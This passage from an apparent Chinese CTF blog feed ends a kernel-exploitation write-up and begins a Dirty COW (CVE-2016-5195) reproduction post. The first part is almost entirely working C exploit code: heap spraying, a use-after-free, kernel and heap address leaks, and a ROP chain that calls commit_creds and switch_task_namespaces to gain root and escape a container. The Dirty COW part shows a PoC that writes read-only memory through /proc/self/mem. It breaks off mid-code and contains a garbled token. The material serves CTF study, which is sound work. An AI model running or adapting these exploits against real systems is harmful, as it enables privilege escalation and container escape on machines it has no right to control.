perror(<span class="hljs-string">&quot;pthread created failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">join_poll_threads</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; poll_threads; i++ )&#123;<br>        pthread_join(poll_tid[i], <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    poll_threads = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * User_key_payload </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;                                                                             <br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_operations alloc</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_seq_op</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_fds</span><span class="hljs-params">()</span>&#123;<br>    fds[<span class="hljs-number">0</span>] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fds[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;open /etc/passwd failed&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_kernel_addr</span><span class="hljs-params">(<span class="hljs-type">char</span> *buff)</span>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>(((<span class="hljs-type">size_t</span> *)buff)[idx] &gt;= PROC_SINGLE_SHOW )&#123;<br>            kernel_offset = ((<span class="hljs-type">size_t</span> *)buff)[idx] - PROC_SINGLE_SHOW;<br>            kernel_base = kernel_offset + <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>        &#125;<br>        idx++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_heap_addr</span><span class="hljs-params">(<span class="hljs-type">char</span> *buff)</span>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>; <br>    <span class="hljs-type">size_t</span> tmp_addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        tmp_addr = ((<span class="hljs-type">size_t</span> *)buff)[idx];<br>        <span class="hljs-keyword">if</span>(((tmp_addr &amp; HEAP_MASK) == HEAP_MASK)&amp;&amp;((tmp_addr &amp; KERNEL_MASK) != KERNEL_MASK)&amp;&amp;((tmp_addr &amp; VMMAP_MASK) != VMMAP_MASK))&#123;<br>            page_offset_base = ((<span class="hljs-type">size_t</span> *)buff)[idx];<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>        &#125;<br>        idx++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_pipe_buffer</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pipe_id[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Alloc pipe buffer failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(write(pipe_id[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;XXXXX&quot;</span>, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;write to pipe buffer failed&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> description[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x600</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> proc_fd;<br>    <span class="hljs-type">int</span> victim_key_idx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">size_t</span> fake_ops;<br>    <span class="hljs-type">size_t</span> *magic_rop;<br>    <br>    init_fds();<br>    proc_fd = open(<span class="hljs-string">&quot;/proc_rw/cormon&quot;</span>, O_RDWR); <br>   <br>    info_log(<span class="hljs-string">&quot;Step I: Bind the core_0 and Save Status&quot;</span>);<br>    bind_core(<span class="hljs-number">0</span>);        <br>    saveStatus();<br><br><br>    info_log(<span class="hljs-string">&quot;Step II: Spraying the 0x20 seq_operations for cleaning the slab...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_SPRAY_NR; i++)&#123;<br>        seq_id[i] = alloc_seq_op();<br>        <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step III: Spraying part of the 0x20 user_key_payload...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">72</span>; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br><br>    info_log(<span class="hljs-string">&quot;Step IV: Spraying the poll_list in type 4096+32...&quot;</span>);<br>    bind_core(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++)&#123;<br>        create_poll_thread(i, <span class="hljs-number">4096</span>+<span class="hljs-number">32</span>, <span class="hljs-number">3000</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    bind_core(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">14</span>)&#123;&#125;;<br><br>    sleep(<span class="hljs-number">1</span>);<br>    info_log(<span class="hljs-string">&quot;Step V: Spraying remain of the 0x20 user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">72</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125;  <br><br>    info_log(<span class="hljs-string">&quot;Step VI: Insert the proc_rw/cormons&#x27;s 4096 object and free random one user_key_payload..&quot;</span>);<br>    write(proc_fd, data, <span class="hljs-number">4096</span>); <br>    join_poll_threads();<br>    <br>    info_log(<span class="hljs-string">&quot;Step VII: Construct UAF by seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>        seq_id[i] = alloc_seq_op();<br>        <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step VIII: OOB read for leaking the kernel address...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(key_read(key_id[i], data, <span class="hljs-number">0x1000</span>) &gt; <span class="hljs-number">0x10</span>)&#123;<br>            victim_key_idx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_key_idx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatly!We do not found the victim key..&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]The victim key idx we found is %d\n&quot;</span>, victim_key_idx);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(leak_kernel_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Leaking kernel base failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Congratualation!You find the kernel offset : 0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the user_key_payloads, except the corrupted user_key_payload&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_key_idx) <span class="hljs-keyword">continue</span>;<br>        key_revoke(key_id[i]);<br>        key_unlink(key_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        ptmx_id[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>        <span class="hljs-keyword">if</span>(ptmx_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Alloc the ptmx failed...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[victim_key_idx], data, <span class="hljs-number">0x1000</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;read victim key failed&quot;</span>);<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(leak_heap_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;leak heap base failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]We found the kmalloc-1024 slab addr: 0x%lx\n&quot;</span>, page_offset_base);<br>    info_log(<span class="hljs-string">&quot;Up to now, We found those address :)&quot;</span>);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel base addr&quot;</span>, kernel_base);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel offset&quot;</span>, kernel_offset);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel 1024 kmalloc&quot;</span>, page_offset_base);<br>    info_log(<span class="hljs-string">&quot;Step IX: Hijack the control stream...&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the part2 seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>        close(seq_id[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate 32 size poll_list...&quot;</span>);<br>    <span class="hljs-comment">/* these up will free twice the victim user_key_payload */</span><br>    bind_core(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">192</span>; i++)&#123;<br>        create_poll_thread(i, <span class="hljs-number">32</span>, <span class="hljs-number">4000</span>, <span class="hljs-number">1</span>);<br>    &#125; <br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">192</span>)&#123;&#125;;<br>    usleep(<span class="hljs-number">250000</span>);<br>    bind_core(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">/* these up will alloc twice the victim user_key_payload */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free victim user_key_payload to construct poll_list uaf...&quot;</span>);<br>    key_revoke(key_id[victim_key_idx]);<br>    key_unlink(key_id[victim_key_idx]);<br>    ((<span class="hljs-type">size_t</span> *)data)[<span class="hljs-number">0</span>] = page_offset_base - <span class="hljs-number">0x18</span>;<br>    sleep(<span class="hljs-number">1</span>); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate setxattr and user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free all the tty and alloc pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        close(ptmx_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>        alloc_pipe_buffer(i);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">0</span>)&#123;&#125;;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]down!&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;Step X: Construct our magic ROP :^)&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0x41</span>, <span class="hljs-keyword">sizeof</span>(data));<br>    fake_ops = page_offset_base + <span class="hljs-number">0x18</span>;   <br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0</span>]) = ADD_RSP_50_RET + kernel_offset;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x10</span>]) = fake_ops;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x20</span>]) = PUSH_RSI_JMP_RSI_39 + kernel_offset;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x39</span>]) = POP_RSP_RET + kernel_offset;<br>    <br>    <span class="hljs-comment">/* ROP */</span><br>    <span class="hljs-type">size_t</span> index = <span class="hljs-number">0</span>;<br>    magic_rop = (<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x58</span>]);<br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0</span>;<br>    magic_rop[index++] = PREPARE_KERNEL_CRED + kernel_offset;<br>    magic_rop[index++] = MOV_RDI_RAX_RET + kernel_offset;<br>    magic_rop[index++] = COMMIT_CREDS + kernel_offset;<br>    <br>    <span class="hljs-comment">/* switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">1</span>;<br>    magic_rop[index++] = FIND_TASK_BY_VPID + kernel_offset;<br>    magic_rop[index++] = POP_RCX_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0x1000</span>;<br>    magic_rop[index++] = MOV_RDI_RAX_RET + kernel_offset;<br>    magic_rop[index++] = POP_RSI_RET + kernel_offset;<br>    magic_rop[index++] = INIT_NSPROXY + kernel_offset;<br>    magic_rop[index++] = SWITCH_TASK_NAMESPACES + kernel_offset;<br><br>    <span class="hljs-comment">/* new_fs = copy_fs_struct(init_fs) */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = INIT_FS + kernel_offset;<br>    magic_rop[index++] = COPY_FS_STRUCT + kernel_offset;<br>    magic_rop[index++] = MOV_RCX_RAX + kernel_offset;<br>    magic_rop[index++] = PUSH_RCX_POP_RBX + kernel_offset;<br><br>    <span class="hljs-comment">/* find_task_by_vpid(getpid())-&gt;fs = new_fs */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = getpid();<br>    magic_rop[index++] = FIND_TASK_BY_VPID + kernel_offset;<br>    magic_rop[index++] = POP_R8 + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0x6e0</span>;<br>    magic_rop[index++] = ADD_RAX_R8 + kernel_offset;<br>    magic_rop[index++] = MOV_RAX_RBX_POP_4 + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br><br>    magic_rop[index++] = SWAPGS_RESTORE_AND_RETURN_TO_USERMDOE + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = (<span class="hljs-type">size_t</span>)get_root;   <br>    magic_rop[index++] = user_cs;   <br>    magic_rop[index++] = user_rflags;   <br>    magic_rop[index++] = user_sp + <span class="hljs-number">8</span>;   <br>    magic_rop[index++] = user_ss;   <br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Done!&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++)&#123;<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        key_id[i] = key_alloc(description, data, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key_%d alloc failed!&quot;</span>, i);<br>            error_log(<span class="hljs-string">&quot;key_alloc failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Release the whole pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>        close(pipe_id[i][<span class="hljs-number">1</span>]);<br>        close(pipe_id[i][<span class="hljs-number">0</span>]);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>其中有个很大的问题就是经常内核panic会报这两种错误</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9b298f5ed7f01213fb80e9149.jpg"></p><p>初步分析是poll在最后时间到返回的时候报错，没调出来:(</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3ac79f3df8dcd10033313915348b4710b9122f51.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Linux</tag>
      
      <tag>Kernel</tag>
      
      <tag>docker escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2016-5195漏洞复现</title>
    <link href="/2024/01/07/CVE-2016-5195/"/>
    <url>/2024/01/07/CVE-2016-5195/</url>
    
    <content type="html"><![CDATA[<h1 id="Dirty-COW漏洞复现"><a href="#Dirty-COW漏洞复现" class="headerlink" title="Dirty COW漏洞复现"></a>Dirty COW漏洞复现</h1><h1 id="1-基础知识们"><a href="#1-基础知识们" class="headerlink" title="1.基础知识们"></a>1.基础知识们</h1><h2 id="proc-self-mem穿透"><a href="#proc-self-mem穿透" class="headerlink" title="/proc/self/mem穿透"></a><code>/proc/self/mem</code>穿透</h2><p>查看官方proc手册</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">/proc/pid/mem<br>              This file can be used to access the pages of a process<span class="hljs-string">&#x27;s memory through open(2), read(2), and lseek(2).</span><br><span class="hljs-string"></span><br><span class="hljs-string">              Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).</span><br></code></pre></td></tr></table></figure><p>可以看到说明是被用来访问进程的<strong>虚拟内存</strong>，我们可以通过常用的几个系统调用来进行访问，但这里注明一般需要有着高等级的权限，例如root用户(但是这里仅使用普通用户却仍然可以成功，因此我们在源码部分再进行详细解读)</p><p>这里存在一个神奇的点，那就是我们可以通过该文件系统来写入不可写的内存页面，考虑下面这个poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">memwrite</span><span class="hljs-params">(<span class="hljs-type">char</span> *dst, <span class="hljs-type">char</span> *rsc, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-type">int</span> proc_mem;<br>    proc_mem = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(proc_mem &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;open mem failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(lseek(proc_mem, (<span class="hljs-type">size_t</span>)dst, SEEK_SET) == <span class="hljs-number">-1</span>)&#123;<br>        perror(<span class="hljs-string">&quot;lseek failed&quot;</span>);<br>        close(proc_mem);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(write(proc_mem, rsc, size) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        close(proc_mem);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Successfully write to the mem %p\n&quot;</span>, dst);<br>    close(proc_mem);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;   <br>    <span class="hljs-type">size_t</span> *mymap;<br>    <span class="hljs-type">char</span> strange[] = <span class="hljs-string">&quot;\x41\x41\x41\x41&quot;</span>;<br>    <span class="hljs-type">char</span> interupt = <span class="hljs-string">&#x27;\xcc&#x27;</span>;<br>    mymap = (<span class="hljs-type">size_t</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x9000</span>, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(mymap &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;mmap mymap&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    memwrite((<span class="hljs-type">char</span> *)mymap, (charchuan tou *)strange, <span class="hljs-keyword">sizeof</span>(strange));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mymap content:%s\n&quot;</span>, mymap);<br>    getchar();<br>    memwrite((<span class="hljs-type">char</span> *)getchar, <span class="hljs-string">&quot;\xcc&quot;</span>, <span class="hljs-number">1</span>);<br>    